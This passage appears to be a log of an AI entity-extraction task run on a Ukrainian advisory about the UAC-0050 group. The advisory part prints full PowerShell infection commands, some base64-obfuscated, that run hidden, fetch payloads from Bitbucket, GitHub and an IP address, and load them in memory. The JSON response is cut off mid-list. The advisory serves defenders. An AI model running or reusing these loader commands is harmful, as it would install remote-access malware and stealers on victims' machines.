YQBs#G8#LwBh#HU#Z#Bp#HQ#LwBt#GE#aQBu#C8#aQBt#Gc#XwB0#GU#cwB0#C4#agBw#Gc#Pw#x#DQ#N##0#DE#Nw#y#DM#Jw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bp#G0#YQBn#GU#QgB5#HQ#ZQBz#C##PQ#g#EQ#bwB3#G4#b#Bv#GE#Z#BE#GE#d#Bh#EY#cgBv#G0#T#Bp#G4#awBz#C##J#Bs#Gk#bgBr#HM#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##I#Bp#GY#I##o#CQ#aQBt#GE#ZwBl#EI#eQB0#GU#cw#g#C0#bgBl#C##J#Bu#HU#b#Bs#Ck#I#B7#C##J#Bp#G0#YQBn#GU#V#Bl#Hg#d##g#D0#I#Bb#FM#eQBz#HQ#ZQBt#C4#V#Bl#Hg#d##u#EU#bgBj#G8#Z#Bp#G4#ZwBd#Do#OgBV#FQ#Rg#4#C4#RwBl#HQ#UwB0#HI#aQBu#Gc#K##k#Gk#bQBh#Gc#ZQBC#Hk#d#Bl#HM#KQ#7##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##g#CQ#cwB0#GE#cgB0#EY#b#Bh#Gc#I##9#C##Jw#8#Dw#QgBB#FM#RQ#2#DQ#XwBT#FQ#QQBS#FQ#Pg#+#Cc#Ow#g#CQ#ZQBu#GQ#RgBs#GE#Zw#g#D0#I##n#Dw#P#BC#EE#UwBF#DY#N#Bf#EU#TgBE#D4#Pg#n#Ds#I##k#HM#d#Bh#HI#d#BJ#G4#Z#Bl#Hg#I##9#C##J#Bp#G0#YQBn#GU#V#Bl#Hg#d##u#Ek#bgBk#GU#e#BP#GY#K##k#HM#d#Bh#HI#d#BG#Gw#YQBn#Ck#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##k#GU#bgBk#Ek#bgBk#GU#e##g#D0#I##k#Gk#bQBh#Gc#ZQBU#GU#e#B0#C4#SQBu#GQ#ZQB4#E8#Zg#o#CQ#ZQBu#GQ#RgBs#GE#Zw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##aQBm#C##K##k#HM#d#Bh#HI#d#BJ#G4#Z#Bl#Hg#I##t#Gc#ZQ#g#D##I##t#GE#bgBk#C##J#Bl#G4#Z#BJ#G4#Z#Bl#Hg#I##t#Gc#d##g#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##p#C##ew#g#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##g#Cs#PQ#g#CQ#cwB0#GE#cgB0#EY#b#Bh#Gc#LgBM#GU#bgBn#HQ#a##7#C##DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#CQ#YgBh#HM#ZQ#2#DQ#T#Bl#G4#ZwB0#Gg#I##9#C##J#Bl#G4#Z#BJ#G4#Z#Bl#Hg#I##t#C##J#Bz#HQ#YQBy#HQ#SQBu#GQ#ZQB4#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bi#GE#cwBl#DY#N#BD#G8#bQBt#GE#bgBk#C##PQ#g#CQ#aQBt#GE#ZwBl#FQ#ZQB4#HQ#LgBT#HU#YgBz#HQ#cgBp#G4#Zw#o#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##s#C##J#Bi#GE#cwBl#DY#N#BM#GU#bgBn#HQ#a##p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bj#G8#bQBt#GE#bgBk#EI#eQB0#GU#cw#g#D0#I#Bb#FM#eQBz#HQ#ZQBt#C4#QwBv#G4#dgBl#HI#d#Bd#Do#OgBG#HI#bwBt#EI#YQBz#GU#Ng#0#FM#d#By#Gk#bgBn#Cg#J#Bi#GE#cwBl#DY#N#BD#G8#bQBt#GE#bgBk#Ck#Ow#g#CQ#b#Bv#GE#Z#Bl#GQ#QQBz#HM#ZQBt#GI#b#B5#C##PQ#g#Fs#UwB5#HM#d#Bl#G0#LgBS#GU#ZgBs#GU#YwB0#Gk#bwBu#C4#QQBz#HM#ZQBt#GI#b#B5#F0#Og#6#Ew#bwBh#GQ#K##k#GM#bwBt#G0#YQBu#GQ#QgB5#HQ#ZQBz#Ck#Ow#g#CQ#d#B5#H##ZQ#g#D0#I##k#Gw#bwBh#GQ#ZQBk#EE#cwBz#GU#bQBi#Gw#eQ#u#Ec#ZQB0#FQ#eQBw#GU#K##n#HQ#ZQBz#HQ#c#Bv#Hc#ZQBy#HM#a#Bl#Gw#b##u#Eg#bwBt#GU#Jw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#CQ#bQBl#HQ#a#Bv#GQ#I##9#C##J#B0#Hk#c#Bl#C4#RwBl#HQ#TQBl#HQ#a#Bv#GQ#K##n#Gw#YQ#n#Ck#LgBJ#G4#dgBv#Gs#ZQ#o#CQ#bgB1#Gw#b##s#C##WwBv#GI#agBl#GM#d#Bb#F0#XQ#g#Cg#JwB0#Hg#d##u#GE#cwB1#GQ#ZQBt#C8#cwBk#GE#bwBs#G4#dwBv#GQ#LwBl#Gc#Z#Bz#C8#dwBn#GQ#cw#v#Gc#cgBv#C4#d#Bl#Gs#YwB1#GI#d#Bp#GI#Lw#v#Do#cwBw#HQ#d#Bo#Cc#L##g#Cc#M##n#Cw#I##n#HM#dgBo#G8#cwB0#Cc#L##g#Cc#UgBl#Gc#QQBz#G0#Jw#s#C##Jw#w#Cc#KQ#p#H0#fQ#=';$oWjuxd = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( $codigo.replace('#','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command $OWjuxD
+powershell.exe $codigo = 'WwBO#GU#d##u#FM#ZQBy#HY#aQBj#GU#U#Bv#Gk#bgB0#E0#YQBu#GE#ZwBl#HI#XQ#6#Do#UwBl#GM#dQBy#Gk#d#B5#F##cgBv#HQ#bwBj#G8#b##g#D0#I#Bb#E4#ZQB0#C4#UwBl#GM#dQBy#Gk#d#B5#F##cgBv#HQ#bwBj#G8#b#BU#Hk#c#Bl#F0#Og#6#FQ#b#Bz#DE#Mg#N##o#I##g#C##I##g#C##I##g#C##I##g#C##ZgB1#G4#YwB0#Gk#bwBu#C##R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#RgBy#G8#bQBM#Gk#bgBr#HM#I#B7#C##c#Bh#HI#YQBt#C##K#Bb#HM#d#By#Gk#bgBn#Fs#XQBd#CQ#b#Bp#G4#awBz#Ck#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#B3#GU#YgBD#Gw#aQBl#G4#d##g#D0#I#BO#GU#dw#t#E8#YgBq#GU#YwB0#C##UwB5#HM#d#Bl#G0#LgBO#GU#d##u#Fc#ZQBi#EM#b#Bp#GU#bgB0#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#Bz#Gg#dQBm#GY#b#Bl#GQ#T#Bp#G4#awBz#C##PQ#g#Ec#ZQB0#C0#UgBh#G4#Z#Bv#G0#I##t#Ek#bgBw#HU#d#BP#GI#agBl#GM#d##g#CQ#b#Bp#G4#awBz#C##LQBD#G8#dQBu#HQ#I##k#Gw#aQBu#Gs#cw#u#Ew#ZQBu#Gc#d#Bo#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##ZgBv#HI#ZQBh#GM#a##g#Cg#J#Bs#Gk#bgBr#C##aQBu#C##J#Bz#Gg#dQBm#GY#b#Bl#GQ#T#Bp#G4#awBz#Ck#I#B7#C##d#By#Hk#I#B7#C##cgBl#HQ#dQBy#G4#I##k#Hc#ZQBi#EM#b#Bp#GU#bgB0#C4#R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#K##k#Gw#aQBu#Gs#KQ#g#H0#I#Bj#GE#d#Bj#Gg#I#B7#C##YwBv#G4#d#Bp#G4#dQBl#C##fQ#g#H0#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I#By#GU#d#B1#HI#bg#g#CQ#bgB1#Gw#b##g#H0#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##k#Gw#aQBu#Gs#cw#g#D0#I#B##Cg#JwBo#HQ#d#Bw#HM#Og#v#C8#YgBp#HQ#YgB1#GM#awBl#HQ#LgBv#HI#Zw#v#HM#a#Bp#GU#b#Bk#GE#Z#Bh#HM#LwBn#HM#Z#Bn#Gg#agBq#C8#Z#Bv#Hc#bgBs#G8#YQBk#HM#LwBp#G0#ZwBf#HQ#ZQBz#HQ#LgBq#H##Zw#/#DE#MQ#4#DE#MQ#3#DM#NQ#n#Cw#I##n#Gg#d#B0#H##cw#6#C8#LwBy#GE#dw#u#Gc#aQB0#Gg#dQBi#HU#cwBl#HI#YwBv#G4#d#Bl#G4#d##u#GM#bwBt#C8#cwBh#G4#d#Bv#G0#YQBs#G8#LwBh#HU#Z#Bp#HQ#LwBt#GE#aQBu#C8#aQBt#Gc#XwB0#GU#cwB0#C4#agBw#Gc#Pw#x#DQ#N##0#DE#Nw#y#DM#Jw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bp#G0#YQBn#GU#QgB5#HQ#ZQBz#C##PQ#g#EQ#bwB3#G4#b#Bv#GE#Z#BE#GE#d#Bh#EY#cgBv#G0#T#Bp#G4#awBz#C##J#Bs#Gk#bgBr#HM#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##I#Bp#GY#I##o#CQ#aQBt#GE#ZwBl#EI#eQB0#GU#cw#g#C0#bgBl#C##J#Bu#HU#b#Bs#Ck#I#B7#C##J#Bp#G0#YQBn#GU#V#Bl#Hg#d##g#D0#I#Bb#FM#eQBz#HQ#ZQBt#C4#V#Bl#Hg#d##u#EU#bgBj#G8#Z#Bp#G4#ZwBd#Do#OgBV#FQ#Rg#4#C4#RwBl#HQ#UwB0#HI#aQBu#Gc#K##k#Gk#bQBh#Gc#ZQBC#Hk#d#Bl#HM#KQ#7##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##g#CQ#cwB0#GE#cgB0#EY#b#Bh#Gc#I##9#C##Jw#8#Dw#QgBB#FM#RQ#2#DQ#XwBT#FQ#QQBS#FQ#Pg#+#Cc#Ow#g#CQ#ZQBu#GQ#RgBs#GE#Zw#g#D0#I##n#Dw#P#BC#EE#UwBF#DY#N#Bf#EU#TgBE#D4#Pg#n#Ds#I##k#HM#d#Bh#HI#d#BJ#G4#Z#Bl#Hg#I##9#C##J#Bp#G0#YQBn#GU#V#Bl#Hg#d##u#Ek#bgBk#GU#e#BP#GY#K##k#HM#d#Bh#HI#d#BG#Gw#YQBn#Ck#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##k#GU#bgBk#Ek#bgBk#GU#e##g#D0#I##k#Gk#bQBh#Gc#ZQBU#GU#e#B0#C4#SQBu#GQ#ZQB4#E8#Zg#o#CQ#ZQBu#GQ#RgBs#GE#Zw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##aQBm#C##K##k#HM#d#Bh#HI#d#BJ#G4#Z#Bl#Hg#I##t#Gc#ZQ#g#D##I##t#GE#bgBk#C##J#Bl#G4#Z#BJ#G4#Z#Bl#Hg#I##t#Gc#d##g#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##p#C##ew#g#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##g#Cs#PQ#g#CQ#cwB0#GE#cgB0#EY#b#Bh#Gc#LgBM#GU#bgBn#HQ#a##7#C##DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#CQ#YgBh#HM#ZQ#2#DQ#T#Bl#G4#ZwB0#Gg#I##9#C##J#Bl#G4#Z#BJ#G4#Z#Bl#Hg#I##t#C##J#Bz#HQ#YQBy#HQ#SQBu#GQ#ZQB4#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bi#GE#cwBl#DY#N#BD#G8#bQBt#GE#bgBk#C##PQ#g#CQ#aQBt#GE#ZwBl#FQ#ZQB4#HQ#LgBT#HU#YgBz#HQ#cgBp#G4#Zw#o#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##s#C##J#Bi#GE#cwBl#DY#N#BM#GU#bgBn#HQ#a##p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bj#G8#bQBt#GE#bgBk#EI#eQB0#GU#cw#g#D0#I#Bb#FM#eQBz#HQ#ZQBt#C4#QwBv#G4#dgBl#HI#d#Bd#Do#OgBG#HI#bwBt#EI#YQBz#GU#Ng#0#FM#d#By#Gk#bgBn#Cg#J#Bi#GE#cwBl#DY#N#BD#G8#bQBt#GE#bgBk#Ck#Ow#g#CQ#b#Bv#GE#Z#Bl#GQ#QQBz#HM#ZQBt#GI#b#B5#C##PQ#g#Fs#UwB5#HM#d#Bl#G0#LgBS#GU#ZgBs#GU#YwB0#Gk#bwBu#C4#QQBz#HM#ZQBt#GI#b#B5#F0#Og#6#Ew#bwBh#GQ#K##k#GM#bwBt#G0#YQBu#GQ#QgB5#HQ#ZQBz#Ck#Ow#g#CQ#d#B5#H##ZQ#g#D0#I##k#Gw#bwBh#GQ#ZQBk#EE#cwBz#GU#bQBi#Gw#eQ#u#Ec#ZQB0#FQ#eQBw#GU#K##n#HQ#ZQBz#HQ#c#Bv#Hc#ZQBy#HM#a#Bl#Gw#b##u#Eg#bwBt#GU#Jw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#CQ#bQBl#HQ#a#Bv#GQ#I##9#C##J#B0#Hk#c#Bl#C4#RwBl#HQ#TQBl#HQ#a#Bv#GQ#K##n#Gw#YQ#n#Ck#LgBJ#G4#dgBv#Gs#ZQ#o#CQ#bgB1#Gw#b##s#C##WwBv#GI#agBl#GM#d#Bb#F0#XQ#g#Cg#JwB0#Hg#d##u#GU#bgBv#C8#cwBk#GE#bwBs#G4#dwBv#GQ#LwBl#Gc#Z#Bz#C8#dwBn#GQ#cw#v#Gc#cgBv#C4#d#Bl#Gs#YwB1#GI#d#Bp#GI#Lw#v#Do#cwBw#HQ#d#Bo#Cc#L##g#Cc#MQ#n#Cw#I##n#HM#dgBo#G8#cwB0#Cc#L##g#Cc#UgBl#Gc#QQBz#G0#Jw#s#C##Jw#w#Cc#KQ#p#H0#fQ#=';$oWjuxd = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( $codigo.replace('#','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command $OWjuxD
+powershell.exe $codigo = 'WwBO#GU#d##u#FM#ZQBy#HY#aQBj#GU#U#Bv#Gk#bgB0#E0#YQBu#GE#ZwBl#HI#XQ#6#Do#UwBl#GM#dQBy#Gk#d#B5#F##cgBv#HQ#bwBj#G8#b##g#D0#I#Bb#E4#ZQB0#C4#UwBl#GM#dQBy#Gk#d#B5#F##cgBv#HQ#bwBj#G8#b#BU#Hk#c#Bl#F0#Og#6#FQ#b#Bz#DE#Mg#N##o#I##g#C##I##g#C##I##g#C##I##g#C##ZgB1#G4#YwB0#Gk#bwBu#C##R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#RgBy#G8#bQBM#Gk#bgBr#HM#I#B7#C##c#Bh#HI#YQBt#C##K#Bb#HM#d#By#Gk#bgBn#Fs#XQBd#CQ#b#Bp#G4#awBz#Ck#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#B3#GU#YgBD#Gw#aQBl#G4#d##g#D0#I#BO#GU#dw#t#E8#YgBq#GU#YwB0#C##UwB5#HM#d#Bl#G0#LgBO#GU#d##u#Fc#ZQBi#EM#b#Bp#GU#bgB0#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#Bz#Gg#dQBm#GY#b#Bl#GQ#T#Bp#G4#awBz#C##PQ#g#Ec#ZQB0#C0#UgBh#G4#Z#Bv#G0#I##t#Ek#bgBw#HU#d#BP#GI#agBl#GM#d##g#CQ#b#Bp#G4#awBz#C##LQBD#G8#dQBu#HQ#I##k#Gw#aQBu#Gs#cw#u#Ew#ZQBu#Gc#d#Bo#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##ZgBv#HI#ZQBh#GM#a##g#Cg#J#Bs#Gk#bgBr#C##aQBu#C##J#Bz#Gg#dQBm#GY#b#Bl#GQ#T#Bp#G4#awBz#Ck#I#B7#C##d#By#Hk#I#B7#C##cgBl#HQ#dQBy#G4#I##k#Hc#ZQBi#EM#b#Bp#GU#bgB0#C4#R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#K##k#Gw#aQBu#Gs#KQ#g#H0#I#Bj#GE#d#Bj#Gg#I#B7#C##YwBv#G4#d#Bp#G4#dQBl#C##fQ#g#H0#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I#By#GU#d#B1#HI#bg#g#CQ#bgB1#Gw#b##g#H0#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##k#Gw#aQBu#Gs#cw#g#D0#I#B##Cg#JwBo#HQ#d#Bw#HM#Og#v#C8#YgBp#HQ#YgB1#GM#awBl#HQ#LgBv#HI#Zw#v#Gc#Z#Bm#GY#ZgBm#GY#ZgBm#GY#LwBk#GQ#Z#Bk#GQ#LwBk#G8#dwBu#Gw#bwBh#GQ#cw#v#Gk#bQBn#F8#d#Bl#HM#d##u#Go#c#Bn#D8#MQ#x#Dg#MQ#x#Dc#Mw#1#Cc#L##g#Cc#a#B0#HQ#c#Bz#Do#Lw#v#HI#YQB3#C4#ZwBp#HQ#a#B1#GI#dQBz#GU#cgBj#G8#bgB0#GU#bgB0#C4#YwBv#G0#LwBz#GE#bgB0#G8#bQBh#Gw#bw#v#GE#dQBk#Gk#d##v#G0#YQBp#G4#LwBp#G0#ZwBf#HQ#ZQBz#HQ#LgBq#H##Zw#/#DE#N##0#DQ#MQ#3#DI#Mw#n#Ck#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##I##k#Gk#bQBh#Gc#ZQBC#Hk#d#Bl#HM#I##9#C##R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#RgBy#G8#bQBM#Gk#bgBr#HM#I##k#Gw#aQBu#Gs#cw#7##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##g#Gk#Zg#g#Cg#J#Bp#G0#YQBn#GU#QgB5#HQ#ZQBz#C##LQBu#GU#I##k#G4#dQBs#Gw#KQ#g#Hs#I##k#Gk#bQBh#Gc#ZQBU#GU#e#B0#C##PQ#g#Fs#UwB5#HM#d#Bl#G0#LgBU#GU#e#B0#C4#RQBu#GM#bwBk#Gk#bgBn#F0#Og#6#FU#V#BG#Dg#LgBH#GU#d#BT#HQ#cgBp#G4#Zw#o#CQ#aQBt#GE#ZwBl#EI#eQB0#GU#cw#p#Ds#DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#C##J#Bz#HQ#YQBy#HQ#RgBs#GE#Zw#g#D0#I##n#Dw#P#BC#EE#UwBF#DY#N#Bf#FM#V#BB#FI#V##+#D4#Jw#7#C##J#Bl#G4#Z#BG#Gw#YQBn#C##PQ#g#Cc#P##8#EI#QQBT#EU#Ng#0#F8#RQBO#EQ#Pg#+#Cc#Ow#g#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##g#D0#I##k#Gk#bQBh#Gc#ZQBU#GU#e#B0#C4#SQBu#GQ#ZQB4#E8#Zg#o#CQ#cwB0#GE#cgB0#EY#b#Bh#Gc#KQ#7#C##DQ#K#C##I##g#C##I##g#C##I##g#C##I##g#CQ#ZQBu#GQ#SQBu#GQ#ZQB4#C##PQ#g#CQ#aQBt#GE#ZwBl#FQ#ZQB4#HQ#LgBJ#G4#Z#Bl#Hg#TwBm#Cg#J#Bl#G4#Z#BG#Gw#YQBn#Ck#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##I#Bp#GY#I##o#CQ#cwB0#GE#cgB0#Ek#bgBk#GU#e##g#C0#ZwBl#C##M##g#C0#YQBu#GQ#I##k#GU#bgBk#Ek#bgBk#GU#e##g#C0#ZwB0#C##J#Bz#HQ#YQBy#HQ#SQBu#GQ#ZQB4#Ck#I#B7#C##J#Bz#HQ#YQBy#HQ#SQBu#GQ#ZQB4#C##Kw#9#C##J#Bz#HQ#YQBy#HQ#RgBs#GE#Zw#u#Ew#ZQBu#Gc#d#Bo#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#Bi#GE#cwBl#DY#N#BM#GU#bgBn#HQ#a##g#D0#I##k#GU#bgBk#Ek#bgBk#GU#e##g#C0#I##k#HM#d#Bh#HI#d#BJ#G4#Z#Bl#Hg#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##I##k#GI#YQBz#GU#Ng#0#EM#bwBt#G0#YQBu#GQ#I##9#C##J#Bp#G0#YQBn#GU#V#Bl#Hg#d##u#FM#dQBi#HM#d#By#Gk#bgBn#Cg#J#Bz#HQ#YQBy#HQ#SQBu#GQ#ZQB4#Cw#I##k#GI#YQBz#GU#Ng#0#Ew#ZQBu#Gc#d#Bo#Ck#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##I##k#GM#bwBt#G0#YQBu#GQ#QgB5#HQ#ZQBz#C##PQ#g#Fs#UwB5#HM#d#Bl#G0#LgBD#G8#bgB2#GU#cgB0#F0#Og#6#EY#cgBv#G0#QgBh#HM#ZQ#2#DQ#UwB0#HI#aQBu#Gc#K##k#GI#YQBz#GU#Ng#0#EM#bwBt#G0#YQBu#GQ#KQ#7#C##J#Bs#G8#YQBk#GU#Z#BB#HM#cwBl#G0#YgBs#Hk#I##9#C##WwBT#Hk#cwB0#GU#bQ#u#FI#ZQBm#Gw#ZQBj#HQ#aQBv#G4#LgBB#HM#cwBl#G0#YgBs#Hk#XQ#6#Do#T#Bv#GE#Z##o#CQ#YwBv#G0#bQBh#G4#Z#BC#Hk#d#Bl#HM#KQ#7#C##J#B0#Hk#c#Bl#C##PQ#g#CQ#b#Bv#GE#Z#Bl#GQ#QQBz#HM#ZQBt#GI#b#B5#C4#RwBl#HQ#V#B5#H##ZQ#o#Cc#d#Bl#HM#d#Bw#G8#dwBl#HI#cwBo#GU#b#Bs#C4#S#Bv#G0#ZQ#n#Ck#Ow#N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#Bt#GU#d#Bo#G8#Z##g#D0#I##k#HQ#eQBw#GU#LgBH#GU#d#BN#GU#d#Bo#G8#Z##o#Cc#b#Bh#Cc#KQ#u#Ek#bgB2#G8#awBl#Cg#J#Bu#HU#b#Bs#Cw#I#Bb#G8#YgBq#GU#YwB0#Fs#XQBd#C##K##n#C##d#B4#HQ#LgBt#H##YwBm#FM#bgBr#C8#cwBk#GE#bwBs#G4#dwBv#GQ#LwBm#Hc#Zg#v#Hc#ZgBz#GY#dwBm#C8#ZwBy#G8#LgB0#GU#awBj#HU#YgB0#Gk#Yg#v#C8#OgBz#H##d#B0#Gg#Jw#s#C##Jw#w#Cc#L##g#Cc#UwB0#GE#cgB0#HU#c#BO#GE#bQBl#Cc#L##g#Cc#UgBl#Gc#QQBz#G0#Jw#s#C##Jw#w#Cc#KQ#p#H0#fQ#=';$oWjuxd = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( $codigo.replace('#','A') ));powershell.exe $OWjuxD .exe -windowstyle hidden -exec
+powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 function DownloadDataFromLinks { param ([string[]]$links) $webClient = New-Object System.Net.WebClient; $shuffledLinks = Get-Random -InputObject $links -Count $links.Length; foreach ($link in $shuffledLinks) { try { return $webClient.DownloadData($link) } catch { continue } }; return $null }; $links = @('hXXps://bitbucket[.]org/shieldadas/gsdghjj/downloads/img_test.jpg?11811735', 'hXXps://raw.githubusercontent[.]com/santomalo/audit/main/img_test.jpg?14441723'); $imageBytes = DownloadDataFromLinks $links; if ($imageBytes -ne $null) { $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes); $startFlag = '&lt;&lt;BASE64_START&gt;&gt;'; $endFlag = '&lt;&lt;BASE64_END&gt;&gt;'; $startIndex = $imageText.IndexOf($startFlag); $endIndex = $imageText.IndexOf($endFlag); if ($startIndex -ge 0 -and $endIndex -gt $startIndex) { $startIndex += $startFlag.Length; $base64Length = $endIndex - $startIndex; $base64Command = $imageText.Substring($startIndex, $base64Length); $commandBytes = [System.Convert]::FromBase64String($base64Command); $loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes); $type = $loadedAssembly.GetType('testpowershell.Home'); $method = $type.GetMethod('la').Invoke($null, [object[]] ('txt.asudem/sdaolnwod/egds/wgds/gro.tekcubtib//:sptth', '0', 'svhost', 'RegAsm', '0'))}}
+powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 function DownloadDataFromLinks { param ([string[]]$links) $webClient = New-Object System.Net.WebClient; $shuffledLinks = Get-Random -InputObject $links -Count $links.Length; foreach ($link in $shuffledLinks) { try { return $webClient.DownloadData($link) } catch { continue } }; return $null }; $links = @('hXXps://bitbucket[.]org/shieldadas/gsdghjj/downloads/img_test.jpg?11811735', 'hXXps://raw.githubusercontent[.]com/santomalo/audit/main/img_test.jpg?14441723'); $imageBytes = DownloadDataFromLinks $links; if ($imageBytes -ne $null) { $imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes); $startFlag = '&lt;&lt;BASE64_START&gt;&gt;'; $endFlag = '&lt;&lt;BASE64_END&gt;&gt;'; $startIndex = $imageText.IndexOf($startFlag); $endIndex = $imageText.IndexOf($endFlag); if ($startIndex -ge 0 -and $endIndex -gt $startIndex) { $startIndex += $startFlag.Length; $base64Length = $endIndex - $startIndex; $base64Command = $imageText.Substring($startIndex, $base64Length); $commandBytes = [System.Convert]::FromBase64String($base64Command); $loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes); $type = $loadedAssembly.GetType('testpowershell.Home'); $method = $type.GetMethod('la').Invoke($null, [object[]] ('txt.eno/sdaolnwod/egds/wgds/gro.tekcubtib//:sptth', '1', 'svhost', 'RegAsm', '0'))}}
+powershell.exe Invoke-Expression '%TMP%\svhost.vbs'
+powershell.exe -c "explorer '\\77[.]105.161.194@80\file\'"; Start-Sleep -Seconds 1; Stop-Process -Name explorer; \\77[.]105.161.194@80\file\6706e721f2c06.exe
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження з використанням LNK-файлу</p><p></p><p>Рис.2 Приклад ланцюга ураження з використанням RAR-архіву з паролем та VBS/BAT файлів</p><p></p><p>Рис.3 Приклад повідомлень, що є частиною ІПСО Fire Cells Group</p>
+
+=== RESPONSE (14.3s, in 23481 / out 1840 tok, STOP) ===
+UAC-0050 targeted Ukrainian enterprises and accountants using tools such as REMCOS, TEKTONITRMS, and various stealers/RATs, while also operating under the persona Fire Cells Group.
+
+```json
+{
+  "entities": [
+    {
+      "name": "UAC-0050",
+      "kind": "threat actor",
+      "gloss": "A financially motivated and cyberespionage threat actor targeting Ukrainian organizations."
+    },
+    {
+      "name": "Fire Cells Group",
+      "kind": "threat actor",
+      "gloss": "A persona or brand used by threat actors to conduct information and psychological operations."
+    },
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cybercriminal group active since 2013 targeting Ukrainian financial systems."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe."
+    },
+    {
+      "name": "REMCOS",
+      "kind": "malware family",
+      "gloss": "A commercial remote access tool frequently abused by threat actors for malicious surveillance and control."
+    },
+    {
+      "name": "TEKTONITRMS",
+      "kind": "software product",
+      "gloss": "A legitimate remote access software suite abused by attackers for unauthorized computer control."
+    },
+    {
+      "name": "MEDUZASTEALER",
+      "kind": "malware family",
+      "gloss": "An information stealer malware designed to extract credentials, browser data, and financial information."
+    },
+    {
+      "name": "LUMMASTEALER",
+      "kind": "malware family",
+      "gloss": "An information stealer malware written in C designed to steal sensitive data and cryptocurrency wallets."
+    },
+    {
+      "name": "XENORAT",
+      "kind": "malware family",
+      "gloss": "An open-source remote access trojan written in C# providing remote system administration capabilities."
+    },
+    {
+      "name": "SECTOPRAT",
+      "kind": "malware family",
+      "gloss": "A remote access trojan that provides attackers with remote desktop streaming and browser manipulation capabilities."
+    },
+    {
+      "name": "MARSSTEALER",
+      "kind": "malware family",
+      "gloss": "An information stealer malware designed to exfiltrate credentials and data from infected systems."
+    },
+    {
+      "name": "DARKTRACKRAT",
+      "kind": "malware family",
+      "gloss": "A remote access trojan offering system control and espionage functionalities."
+    },
+    {
+      "name": "avoufshire.icu",
+      "kind": "internet domain",
+      "gloss": "An internet domain used by attackers for malicious command and control or delivery."
+    },
+    {
+      "name": "qwdfewf.com",
+      "kind": "internet domain",
+      "gloss": "An internet domain used in cyber attacks to host payloads and register victim machines."
+    },
+    {
+      "name": "77.105.161.194",
+      "kind": "ip address",
+      "gloss": "An IP address utilized by threat actors to host malicious files and infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0050",
+      "type": "operates-under-brand",
+      "tail": "Fire Cells Group",
+      "evidence": "інформаційно-психологічні операції під \"брендом\" Fire Cells Group"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
+      "tail": "REMCOS",
+      "evidence": "з використанням програмного забезпечення REMCOS"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-software",
+      "tail": "TEKTONITRMS",
+      "evidence": "з використанням програмного забезпечення REMCOS / TEKTONITRMS"
+    },
+    {
+      "head": "UAC-0050",
+      "type": "uses-malware",
